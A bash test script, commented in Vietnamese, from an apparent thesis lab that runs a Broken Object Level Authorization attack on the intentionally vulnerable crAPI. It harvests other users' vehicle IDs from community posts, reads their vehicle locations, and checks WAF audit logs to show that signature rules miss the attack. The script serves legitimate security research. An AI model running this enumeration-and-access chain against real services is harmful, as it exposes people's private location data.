#!/usr/bin/env bash
# KỊCH BẢN — BOLA / Broken Object Level Authorization (OWASP API1:2023)
#
# Đây là PHÉP ĐO ĐỐI CHỨNG trung tâm của luận văn (A2 KEHOACH-THAYDOI-HETHONG.md):
#   - BOLA là lỗ hổng TẦNG ỨNG DỤNG của crAPI, GIỮ NGUYÊN có chủ đích (HE-THONG §5).
#   - Người dùng hợp lệ (testuser01, crapi-user, token Keycloak hợp lệ, thiết bị
#     browser) truy cập ĐỐI TƯỢNG của người khác: GET /identity/api/v2/vehicle/{id}/location.
#   - Request KHÔNG chứa payload injection nào → chữ ký CRS/ModSecurity KHÔNG
#     bắt được gì. Đây chính là luận điểm: phương pháp dựa-trên-chữ-ký mù với
#     lớp tấn công vượt quyền; lớp Zero-Trust (mТLS + service_acl + RBAC + OPA)
#     và mô hình ML (Giai đoạn C) mới là phần xử lý được.
#
# NGHIỆM THU của script này:
#   1. Các request BOLA đi tới được ứng dụng (không bị chặn ở TLS/biên) — đúng
#      như kỳ vọng, ZTA không vá lỗ hổng app.
#   2. WAF audit log (job=waf-audit) KHÔNG có bản ghi nào cho các path BOLA này.
#   Output thô của phép đo #2 in ra stdout để lưu vào repo.
set -uo pipefail
SCENARIO="crapi_bola"
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$HERE/lib/crapi_common.sh"
crapi_preflight

# Giai đoạn C: kẻ tấn công do orchestrator chỉ định (luân phiên qua
# CRAPI_ATTACKER_POOL); mặc định testuser01 khi chạy tay 1 lượt. Nhãn lượt
# (target_entity trong runs.jsonl) phải TRÙNG tài khoản đăng nhập ở đây —
# crapi_campaign_phaseb.sh đặt cả TARGET_ENTITY lẫn CRAPI_ATTACKER = cùng user.
ATTACKER_USER="${CRAPI_ATTACKER:-testuser01}"
J="$(crapi_login "$ATTACKER_USER" 'Test1234!')"
trap 'rm -f "$J"' EXIT
log "Đăng nhập $ATTACKER_USER (crapi-user, token hợp lệ, thiết bị browser)"

# Lấy vehicle của chính mình (nếu có) để có 1 UUID thật, rồi thử các UUID khác.
declare -a _tls_opts; mapfile -t _tls_opts < <(crapi_curl_tls_opts)
own_json="$(curl -s -A "$BROWSER_UA" "${_tls_opts[@]}" -b "$J" --max-time 20 "$BFF_URL/identity/api/v2/vehicle/vehicles" || true)"
own_uuid="$(printf '%s' "$own_json" | grep -oE '[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}' | head -1)"
log "vehicle của $ATTACKER_USER: ${own_uuid:-<none>}"

# Đóng sổ 2026-10-04 — SỬA LỖI CÔNG CỤ: các bản trước thử UUID "đoán" (649acfac-…0001…) và coi MỌI mã từ app
# (kể cả 404) là "BOLA tới được". Log 2026-09-13, 2026-09-26 và lần đầu 2026-10-04 đều 404 → chưa vòng nào đo trên
# một vụ BOLA THÀNH CÔNG; số "CRS = 0 trên BOLA" trước đây là CRS = 0 trên request 404. Nay đi đúng chuỗi BOLA của
# crAPI: (1) lộ vehicleid của người khác qua community/posts (trường author.vehicleid), (2) đọc
# vehicle/{id}/location của họ. Chỉ tính là BOLA khi trả 200 VÀ email chủ xe ≠ kẻ tấn công.
ATTACKER_EMAIL="${ATTACKER_USER}@ztlab.local"
VICTIMS="${VP_VICTIMS:-${VICTIMS:-0}}"

# §B5 mục 1 (2026-10-13): khúc 1 của đợt 150h cho thấy quét cố định (31 trang ×
# 30 = 930 bài) KHÔNG đủ qua nhiều giờ — N1/N2/campaign đăng bài liên tục suốt
# khúc, "recent" bị pha loãng theo thời gian chạy (không phải theo số bài cố
# định), nên pool tụt dưới VICTIMS=10 dù đã seed 15 nạn nhân (§B1f). Khả năng
# phát hiện suy giảm THEO THỜI GIAN CHẠY — càng về cuối 150h sẽ càng tệ, các
# variant victims=8,10 sẽ gần như không chạy được nếu không sửa.
#
# SỬA: quét SÂU HƠN, LUỸ TIẾN theo trang cho tới khi thu đủ VICTIMS vehicleid
# PHÂN BIỆT, có giới hạn số trang để không quét vô hạn nếu seed thật sự thiếu.
# KHÔNG đọc vehicleid từ file cache ghi lúc seed — làm vậy bỏ qua chuỗi phát
# hiện thật (community/posts → vehicleid) và quay lại đúng lỗi H18 đã sửa
# trước đây; "CRS = 0 trên BOLA" chỉ có nghĩa khi cuộc tấn công đi đúng chuỗi.
BOLA_SCAN_PAGE_SIZE="${BOLA_SCAN_PAGE_SIZE:-30}"
BOLA_SCAN_MAX_PAGES="${BOLA_SCAN_MAX_PAGES:-200}"   # trần 200×30=6000 bài — đủ cho cả khúc dài nhiều giờ
declare -A _seen_map=()
off=0; pages=0; last_batch_n=-1
while :; do
  resp="$(curl -s -A "$BROWSER_UA" "${_tls_opts[@]}" -b "$J" --max-time 20 \
    "$BFF_URL/community/api/v2/community/posts/recent?limit=$BOLA_SCAN_PAGE_SIZE&offset=$off")"
  pages=$((pages + 1))
  last_batch_n=0
  # sentinel "__N__\t<n>" đi qua CHUNG một pipe với vid/email — tránh đua tiến
  # trình giữa process substitution và việc đọc file stderr riêng (đã gặp: đọc
  # file trước khi python flush/đóng, luôn thấy 0, vòng quét dừng sau trang 1).
  while IFS=$'\t' read -r tag rest; do
    if [[ "$tag" == "__N__" ]]; then
      last_batch_n="$rest"
    elif [[ -n "$tag" ]]; then
      _seen_map["$tag"]="$rest"
    fi
  done < <(printf '%s' "$resp" | python3 -c 'import json,sys
try: d=json.load(sys.stdin)
except Exception: sys.exit()
posts=d.get("posts",[])
print(f"__N__\t{len(posts)}")
for p in posts:
    a=p.get("author") or {}
    if a.get("vehicleid") and a.get("email")!=sys.argv[1]:
        vid=a["vehicleid"]; em=a["email"]
        print(f"{vid}\t{em}")' "$ATTACKER_EMAIL")
  distinct=${#_seen_map[@]}
  off=$((off + BOLA_SCAN_PAGE_SIZE))
  # dừng khi: đã đủ nạn nhân yêu cầu, HOẶC trang trả về rỗng (hết dữ liệu thật),
  # HOẶC chạm trần số trang (an toàn, không quét vô hạn).
  if [[ "$VICTIMS" -gt 0 && "$distinct" -ge "$VICTIMS" ]]; then break; fi
  if [[ "${last_batch_n:-0}" -le 0 ]]; then break; fi
  if [[ "$pages" -ge "$BOLA_SCAN_MAX_PAGES" ]]; then break; fi
done
declare -a TARGETS=()
mapfile -t TARGETS < <(printf '%s\n' "${!_seen_map[@]}")
log "vehicleid của người khác lộ qua community/posts: ${#TARGETS[@]} (quét $pages trang × $BOLA_SCAN_PAGE_SIZE) (${TARGETS[*]})"
[[ ${#TARGETS[@]} -ge 1 ]] || fail "không tìm thấy vehicleid nào của người khác qua community/posts — seed thiếu dữ liệu nạn nhân"

# §B1: THỰC THI số nạn nhân. VICTIMS=n → chạm đúng n thực thể KHÁC NHAU (không chỉ
# ghi nhãn). §B1b: LUÂN PHIÊN — xáo trộn POOL nạn nhân (toàn bộ vehicleid lộ ra)
# rồi RÚT ngẫu nhiên VICTIMS cái; khác nhau giữa các lượt, không cố định. Danh
# sách đã dùng ghi vào runs.jsonl (qua CRAPI_RUN_META) để kiểm rò rỉ danh tính sau.
POOL_SIZE=${#TARGETS[@]}
mapfile -t TARGETS < <(printf '%s\n' "${TARGETS[@]}" | shuf)   # luân phiên
if [[ "$VICTIMS" -gt 0 ]]; then
  [[ "$POOL_SIZE" -ge "$VICTIMS" ]] || fail "yêu cầu VICTIMS=$VICTIMS nhưng pool chỉ có $POOL_SIZE vehicleid — seed thêm nạn nhân (§B1b seed-job.yaml)"
  TARGETS=("${TARGETS[@]:0:$VICTIMS}")
fi
log "§B1b: rút ${#TARGETS[@]} nạn nhân từ pool $POOL_SIZE (luân phiên): ${TARGETS[*]}"
if [[ -n "${CRAPI_RUN_META:-}" ]]; then
  printf 'victims_used=%s\n' "$(IFS=,; echo "${TARGETS[*]}")" >> "$CRAPI_RUN_META"
  printf 'victim_pool_size=%s\n' "$POOL_SIZE" >> "$CRAPI_RUN_META"
fi

# Mốc [T0,T1] TƯỜNG MINH bao trọn đúng lưu lượng BOLA của lần chạy NÀY — dùng
# để truy vấn Loki tất định (Phần 1.1 remediation 2026-09), không dùng cửa sổ
# trượt "10 phút gần nhất" (phụ thuộc thời điểm gọi, ăn log của lần chạy khác
# khi gọi lặp lại nhanh — đây là nguyên nhân gốc của FAIL=4 giả trước đó).
T0="$(date +%s)"
echo "---- BOLA requests (HTTP code) — PACE=${PACE:-burst} ----"
reached=0; _i=0; _n=${#TARGETS[@]}
for u in "${TARGETS[@]}"; do
  _i=$((_i + 1))
  [[ $_i -gt 1 ]] && crapi_pace_sleep "$_i" "$_n"   # §B1: nhịp thật giữa các request
  path="/identity/api/v2/vehicle/${u}/location"
  body="$(curl -s -A "$BROWSER_UA" "${_tls_opts[@]}" -b "$J" --max-time 20 -w '\n%{http_code}' "$BFF_URL$path")"
  code="${body##*$'\n'}"; owner="$(printf '%s' "${body%$'\n'*}" | python3 -c 'import json,sys
try: print(json.load(sys.stdin).get("email",""))
except Exception: print("")')"
  printf '  GET %-58s -> %s  chủ xe=%s\n' "$path" "$code" "${owner:-?}"
  # BOLA THÀNH CÔNG = 200 + đọc được dữ liệu của NGƯỜI KHÁC
  [[ "$code" == "200" && -n "$owner" && "$owner" != "$ATTACKER_EMAIL" ]] && reached=$((reached + 1))
done
# Vài endpoint rò rỉ đối tượng khác của crAPI (mass-assignment / object exposure)
for path in \
  "/identity/api/v2/user/dashboard" \
  "/community/api/v2/community/posts/recent" \
  "/workshop/api/shop/orders/all" ; do
  code="$(crapi_call "$J" GET "$path")"
  printf '  GET %-58s -> %s\n' "$path" "$code"
done
# +1: `date +%s` làm tròn XUỐNG; dòng audit CRS của request cuối có phần lẻ giây sau T1 và bị loại khỏi
# (T0,T1] — đúng lỗi đã sửa ở crapi_sqli_waf.sh vòng 4 nhưng sót ở đây. Với BOLA lỗi này thiên về kết
# quả KỲ VỌNG (0 CRS hit), nên phải sửa trước khi trích số đối chứng (đóng sổ 2026-10-04).
T1="$(( $(date +%s) + 1 ))"

[[ $reached -ge 1 ]] || fail "không vụ BOLA nào THÀNH CÔNG (200 + dữ liệu của người khác) — không có gì để đo đối chứng"
log "BOLA thành công $reached/${#TARGETS[@]}: đọc được vị trí xe của người khác — ZTA không vá lỗ hổng app (đúng chủ đích)"

sleep 4   # đợi Promtail batchwait(1s) + ingest Loki trước khi truy vấn — [T0,T1] giữ nguyên, không dịch theo sleep này
echo "---- ĐO ĐỐI CHỨNG: CRS/WAF audit cho path BOLA — khoảng thời gian tường minh [T0=$T0, T1=$T1], KHÔNG dùng cửa sổ trượt ----"
crs_bola="$(loki_count '{job="waf-audit"} |~ "vehicle/[^/]+/location"' "$T0" "$T1")"
crs_any="$(loki_count '{job="waf-audit"} |~ "attack-"' "$T0" "$T1")"
crs_total="$(loki_count '{job="waf-audit"} |~ "\"transaction\""' "$T0" "$T1")"
echo "  CRS hit trên path BOLA (vehicle/{id}/location)   = $crs_bola   [kỳ vọng 0]"
echo "  CRS hit gắn tag tấn công (attack-*) trong [T0,T1]  = $crs_any"
echo "  CRS transaction audited tổng trong [T0,T1]         = $crs_total"

if [[ "$crs_bola" != "0" ]]; then
  fail "$SCENARIO — CRS GHI NHẬN $crs_bola bản ghi trên kịch bản BOLA — điều tra: script có gửi payload bất thường? CRS bắt nhầm? (xem KEHOACH: đây là dấu hiệu bất thường)"
fi

pass "$SCENARIO — BOLA tới được app; CRS/ModSecurity KHÔNG ghi nhận gì trên kịch bản này (số đo đối chứng = 0)"
